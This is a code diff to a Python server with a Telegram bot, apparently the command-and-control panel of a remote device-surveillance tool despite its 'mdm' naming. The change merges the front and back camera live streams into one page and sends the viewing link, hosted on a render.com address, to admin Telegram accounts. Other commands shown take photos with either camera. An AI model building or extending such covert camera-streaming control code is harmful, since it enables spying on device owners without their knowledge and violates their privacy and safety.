@@ -250,8 +250,7 @@ COMMANDS = {
     # camera
     "main-camera":               {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
     "selfie-camera":             {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
-    "start-camera-stream-front": {"category": "camera", "label": "📺 بث كاميرا أمامية",  "description": "بث مباشر من الكاميرا الأمامية", "needs_param": False},
-    "start-camera-stream-back":  {"category": "camera", "label": "📺 بث كاميرا خلفية",   "description": "بث مباشر من الكاميرا الخلفية", "needs_param": False},
+    "start-camera-stream":       {"category": "camera", "label": "📺 بث الكاميرا (أمامية+خلفية)", "description": "بث مباشر للكاميرتين برابط واحد", "needs_param": False},
     "stop-camera-stream":        {"category": "camera", "label": "⏹ إيقاف بث الكاميرا",  "description": "إيقاف بث الكاميرا", "needs_param": False},
     # screenshot تمت إزالته
     # audio
@@ -462,7 +461,7 @@ def data_keyboard(did):
 def camera_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"main-camera"), _cbtn(did,"selfie-camera"))
-    kb.add(_cbtn(did,"start-camera-stream-back"), _cbtn(did,"start-camera-stream-front"))
+    kb.add(_cbtn(did,"start-camera-stream"))
     kb.add(_cbtn(did,"stop-camera-stream"))
     kb.add(_back(did))
     return kb
@@ -1575,37 +1574,70 @@ _camera_streams: dict = {}  # stream_id → {"jpeg": bytes, "timestamp": float, 
 
 @app.route("/live/<stream_id>")
 def _live_stream_page(stream_id):
-    """صفحة HTML لعرض البث المباشر"""
+    """صفحة HTML لعرض البث المباشر - تدعم كاميرتين"""
+    # تحقق إذا البث نشط (قد يكون back أو front)
     if stream_id not in _camera_streams:
         return make_response("<h1>البث غير نشط</h1><p>Stream ID: " + stream_id + "</p>", 404)
 
-    info = _camera_streams[stream_id]
+    # ابحث عن البث الآخر (إذا كان back، ابحث عن front والعكس)
+    other_stream = None
+    if "BACK" in stream_id:
+        for sid in _camera_streams:
+            if "FRONT" in sid:
+                other_stream = sid
+                break
+    elif "FRONT" in stream_id:
+        for sid in _camera_streams:
+            if "BACK" in sid:
+                other_stream = sid
+                break
+
     html = f"""<!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بث مباشر - {stream_id}</title>
+    <title>بث الكاميرا المباشر</title>
     <style>
-        body {{ margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; }}
-        img {{ max-width:100%; max-height:100vh; }}
-        .info {{ position:fixed; top:10px; left:10px; color:#fff; background:rgba(0,0,0,0.5); padding:10px; border-radius:5px; }}
+        body {{ margin:0; background:#111; color:#fff; font-family:Arial,sans-serif; }}
+        .header {{ background:#222; padding:10px; text-align:center; }}
+        .cameras {{ display:flex; flex-wrap:wrap; justify-content:center; padding:10px; gap:10px; }}
+        .camera {{ flex:1; min-width:300px; max-width:50%; }}
+        .camera h3 {{ text-align:center; margin:5px 0; }}
+        img {{ width:100%; border:2px solid #333; border-radius:5px; }}
     </style>
 </head>
 <body>
-    <div class="info">
-        <div><b>📡 Stream:</b> {stream_id}</div>
-        <div><b>📱 Device:</b> {info.get('device_id', '?')}</div>
-        <div><b>🕐 Updated:</b> <span id="time">-</span></div>
+    <div class="header">
+        <h2>📺 بث الكاميرا المباشر</h2>
     </div>
-    <img src="/stream/{stream_id}" alt="Live Stream" />
-    <script>
-        setInterval(function() {{
-            fetch('/stream/{stream_id}/info').then(r=>r.json()).then(d=>{{
-                document.getElementById('time').textContent = d.last_update || '-';
-            }});
-        }}, 1000);
-    </script>
+    <div class="cameras">"""
+    
+    if "BACK" in stream_id or "FRONT" in stream_id:
+        # عرض الكاميرتين
+        back_id = stream_id if "BACK" in stream_id else (other_stream or stream_id)
+        front_id = stream_id if "FRONT" in stream_id else (other_stream or stream_id)
+        
+        html += f"""
+        <div class="camera">
+            <h3>📷 الكاميرا الخلفية</h3>
+            <img src="/stream/{back_id}" alt="Back Camera" />
+        </div>"""
+        
+        if front_id != back_id and front_id in _camera_streams:
+            html += f"""
+        <div class="camera">
+            <h3>🤳 الكاميرا الأمامية</h3>
+            <img src="/stream/{front_id}" alt="Front Camera" />
+        </div>"""
+    else:
+        html += f"""
+        <div class="camera">
+            <img src="/stream/{stream_id}" alt="Camera" />
+        </div>"""
+
+    html += """
+    </div>
 </body>
 </html>"""
     return html
@@ -1669,20 +1701,20 @@ def _sock_camera_frame(data):
             }
             logger.info(f"📺 Camera stream STARTED: {stream_id} from device {device_id}")
             
-            # أرسل رابط البث للبوت
-            if mdm_bot:
+            # ⚡ أرسل رابط البث للبوت فقط عند بدء الكاميرا الخلفية (لتجنب التكرار)
+            if "BACK" in stream_id and mdm_bot:
                 dev = dm.get_device_by_sid(request.sid)
                 short_label = _dev_label(dev) if dev else "?"
                 stream_url = f"https://one-1rre.onrender.com/live/{stream_id}"
                 for admin_id in Config.ADMIN_IDS:
                     try:
                         mdm_bot.bot.send_message(admin_id,
-                            f"📺 <b>بث مباشر للكاميرا</b>\n\n"
+                            f"📺 <b>بث الكاميرا المباشر</b>\n\n"
                             f"📱 <b>{short_label}</b>\n"
-                            f"📷 الكاميرا: {data.get('camera', '?')}\n"
+                            f"📷 الكاميرا: أمامية + خلفية\n"
                             f"━━━━━━━━━━━━━━━\n"
                             f"🔗 <a href=\"{stream_url}\">اضغط هنا لمشاهدة البث</a>\n\n"
-                            f"⏹ لإيقاف البث: أرسل stop-camera-stream",
+                            f"⏹ لإيقاف البث: اضغط زر إيقاف بث الكاميرا",
                             parse_mode="HTML")
                     except Exception as e:
                         logger.error(f"❌ Failed to send stream URL: {e}")
